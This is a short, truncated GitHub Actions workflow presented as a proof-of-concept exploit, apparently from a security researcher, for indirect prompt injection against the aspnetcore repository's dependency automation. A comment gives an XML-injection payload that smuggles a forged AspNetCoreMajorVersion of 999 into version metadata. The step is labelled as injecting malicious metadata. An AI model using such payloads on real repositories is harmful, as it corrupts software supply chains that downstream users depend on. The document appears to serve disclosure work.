name: "Exploit PoC: Indirect Prompt Injection in Supply Chain"
# Researcher: HackerMD (Mohamadisha Shaikh)
# Target: Microsoft .NET/aspnetcore Dependency Automation
# Severity: High (Critical Infrastructure Modification)

on:
  workflow_dispatch:

jobs:
  supply-chain-poisoning:
    name: "Simulate Supply Chain Attack"
    runs-on: ubuntu-latest
    steps:
      - name: "Clone Repository Infrastructure"
        uses: actions/checkout@v4

      - name: "Inject Malicious Metadata"
        id: metadata
        # We use a base64 encoded payload to bypass shell escaping issues entirely.
        # Payload: 1.2.3</SeleniumWebDriverVersion><AspNetCoreMajorVersion>999</AspNetCoreMajorVersion>
